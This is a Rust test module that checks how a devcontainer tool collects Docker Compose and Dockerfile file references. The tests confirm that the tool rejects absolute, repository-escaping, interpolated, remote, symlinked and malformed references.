        std::fs::create_dir_all(&config_dir).unwrap();
        let absolute = parse(r#"{ "build": { "dockerfile": "/tmp/Dockerfile" } }"#).unwrap();
        let error = referenced_files(&absolute, &config_dir).unwrap_err();
        assert!(error.contains("/tmp/Dockerfile"), "{error}");
        assert!(error.contains("is absolute"), "{error}");
        let escaping =
            parse(r#"{ "build": { "dockerfile": "../../outside/Dockerfile" } }"#).unwrap();
        let error = referenced_files(&escaping, &config_dir).unwrap_err();
        assert!(error.contains("../../outside/Dockerfile"), "{error}");
        assert!(error.contains("escapes the repository"), "{error}");
    }

    #[test]
    fn compose_file_references_collects_env_build_extends_and_include() {
        let dir = tempfile::tempdir().unwrap();
        let config_dir = dir.path().canonicalize().unwrap().join(".devcontainer");
        std::fs::create_dir_all(&config_dir).unwrap();
        let refs = compose_file_references(
            &config_dir,
            &config_dir,
            r#"
x-common: &common
  env_file: merged.env
services:
  app:
    <<: *common
    env_file: [".env", {path: "opt.env", required: false}]
    build: {context: "..", dockerfile: "docker/Dockerfile"}
    extends: {file: "base.yml", service: x}
  worker:
    build: "app"
  merged:
    <<: *common
include: ["inc.yml"]
"#,
        )
        .unwrap();
        assert_eq!(
            refs,
            vec![
                ComposeReference {
                    kind: ComposeReferenceKind::EnvFile,
                    path: config_dir.join(".env"),
                    required: true,
                },
                ComposeReference {
                    kind: ComposeReferenceKind::Dockerfile,
                    path: config_dir.join("app/Dockerfile"),
                    required: false,
                },
                ComposeReference {
                    kind: ComposeReferenceKind::ExtendsFile,
                    path: config_dir.join("base.yml"),
                    required: true,
                },
                ComposeReference {
                    kind: ComposeReferenceKind::Include,
                    path: config_dir.join("inc.yml"),
                    required: true,
                },
                ComposeReference {
                    kind: ComposeReferenceKind::EnvFile,
                    path: config_dir.join("merged.env"),
                    required: true,
                },
                ComposeReference {
                    kind: ComposeReferenceKind::EnvFile,
                    path: config_dir.join("opt.env"),
                    required: false,
                },
                ComposeReference {
                    kind: ComposeReferenceKind::Dockerfile,
                    path: dir.path().canonicalize().unwrap().join("docker/Dockerfile"),
                    required: true,
                },
            ]
        );
    }

    #[test]
    fn compose_file_references_refuses_absolute_escaping_interpolated_and_remote_references() {
        let dir = tempfile::tempdir().unwrap();
        let config_dir = dir.path().canonicalize().unwrap().join(".devcontainer");
        std::fs::create_dir_all(&config_dir).unwrap();
        for (yaml, reference, reason) in [
            (
                "services: {app: {env_file: /tmp/env}}",
                "/tmp/env",
                "is absolute",
            ),
            (
                "services: {app: {env_file: ../../outside/.env}}",
                "../../outside/.env",
                "escapes the repository",
            ),
            (
                "services: {app: {env_file: '${ENV_FILE}'}}",
                "${ENV_FILE}",
                "uses variable interpolation",
            ),
            (
                "services: {app: {build: {context: 'https://example.com/r.git'}}}",
                "https://example.com/r.git",
                "is a remote build context",
            ),
        ] {
            let error = compose_file_references(&config_dir, &config_dir, yaml).unwrap_err();
            assert!(error.contains(reference), "{error}");
            assert!(error.contains(reason), "{error}");
        }
    }

    #[test]
    fn compose_file_references_collects_include_maps_and_ignores_inline_dockerfiles() {
        let dir = tempfile::tempdir().unwrap();
        let config_dir = dir.path().canonicalize().unwrap().join(".devcontainer");
        std::fs::create_dir_all(&config_dir).unwrap();
        let refs = compose_file_references(
            &config_dir,
            &config_dir,
            "services:\n  app:\n    build:\n      dockerfile_inline: 'FROM scratch'\ninclude:\n  - path: [one.yml, two.yml]\n    env_file:\n      - path: extra.env\n        required: false\n",
        )
        .unwrap();
        assert_eq!(
            refs,
            vec![
                ComposeReference {
                    kind: ComposeReferenceKind::EnvFile,
                    path: config_dir.join("extra.env"),
                    required: false,
                },
                ComposeReference {
                    kind: ComposeReferenceKind::Include,
                    path: config_dir.join("one.yml"),
                    required: true,
                },
                ComposeReference {
                    kind: ComposeReferenceKind::Include,
                    path: config_dir.join("two.yml"),
                    required: true,
                },
            ]
        );
    }

    #[test]
    fn compose_file_references_refuses_malformed_reference_shapes() {
        let dir = tempfile::tempdir().unwrap();
        let config_dir = dir.path().canonicalize().unwrap().join(".devcontainer");
        std::fs::create_dir_all(&config_dir).unwrap();
        for yaml in [
            "services: {app: {env_file: 3}}",
            "services: {app: {env_file: [3]}}",
            "services: {app: {env_file: [{required: false}]}}",
            "services: {app: {build: 3}}",
            "services: {app: {build: {context: 3}}}",
            "services: {app: {build: {dockerfile: [x]}}}",
            "services: {app: {extends: {file: []}}}",
            "include: {}",
            "include: [{}]",
            "include: [{path: true}]",
            "include: [{path: [valid.yml, 3]}]",
        ] {
            assert!(
                compose_file_references(&config_dir, &config_dir, yaml).is_err(),
                "accepted malformed Compose reference shape: {yaml}"
            );
        }
        assert!(
            compose_file_references(
                &config_dir,
                &config_dir,
                "services: {app: {extends: {service: base}}}"
            )
            .unwrap()
            .is_empty()
        );
    }

    #[test]
    fn compose_file_references_of_a_file_without_services_is_empty() {
        let dir = tempfile::tempdir().unwrap();
        let config_dir = dir.path().canonicalize().unwrap().join(".devcontainer");
        std::fs::create_dir_all(&config_dir).unwrap();
        assert!(
            compose_file_references(&config_dir, &config_dir, "{}")
                .unwrap()
                .is_empty()
        );
        assert!(
            compose_file_references(&config_dir, &config_dir, "services: {}")
                .unwrap()
                .is_empty()
        );
    }

    #[test]
    fn compose_file_references_refuses_invalid_yaml() {
        let dir = tempfile::tempdir().unwrap();
        let config_dir = dir.path().canonicalize().unwrap().join(".devcontainer");
        std::fs::create_dir_all(&config_dir).unwrap();
        let error = compose_file_references(&config_dir, &config_dir, "services: [").unwrap_err();
        assert!(error.contains("is not a valid Compose file"), "{error}");
        let error =
            compose_file_references(&config_dir, &config_dir, "- scalar top level").unwrap_err();
        assert!(error.contains("is not a valid Compose file"), "{error}");
    }

    #[test]
    fn compose_file_references_refuses_a_compose_directory_symlinked_outside_repository() {
        let dir = tempfile::tempdir().unwrap();
        let config_dir = dir.path().canonicalize().unwrap().join(".devcontainer");
        std::fs::create_dir_all(&config_dir).unwrap();
        let outside = crate::testenv::symlinked_tempdir();
        if outside.path() == outside.real_path() {
            return;
        }
        let error = compose_file_references(
            &config_dir,
            outside.path(),
            "services: {app: {env_file: .env}}",
        )
        .unwrap_err();
        assert!(
            error.contains("escapes the repository through a symlink"),
            "{error}"
        );
    }

    #[test]
    fn compose_file_references_refuses_a_reference_symlinked_outside_repository() {
        let dir = tempfile::tempdir().unwrap();
        let config_dir = dir.path().canonicalize().unwrap().join(".devcontainer");
        std::fs::create_dir_all(&config_dir).unwrap();
        let outside = crate::testenv::symlinked_tempdir();
        if outside.path() == outside.real_path() {
            return;
        }
        let resolved = outside.path().join("referenced.env");
        let error =
            check_compose_containment(&config_dir, &resolved, "referenced.env").unwrap_err();
        assert!(
            error.contains("escapes the repository through a symlink"),
            "{error}"
        );
    }

    #[test]
    fn compose_file_references_refuses_to_verify_a_missing_compose_directory() {
        let dir = tempfile::tempdir().unwrap();
        let config_dir = dir.path().canonicalize().unwrap().join(".devcontainer");
        std::fs::create_dir_all(&config_dir).unwrap();
        let missing_dir = config_dir.join("nope");
        let error = compose_file_references(
            &config_dir,
            &missing_dir,
            "services: {app: {env_file: .env}}",
        )
        .unwrap_err();
        assert!(
            error.contains("cannot verify repository containment"),
            "{error}"
        );
    }
}
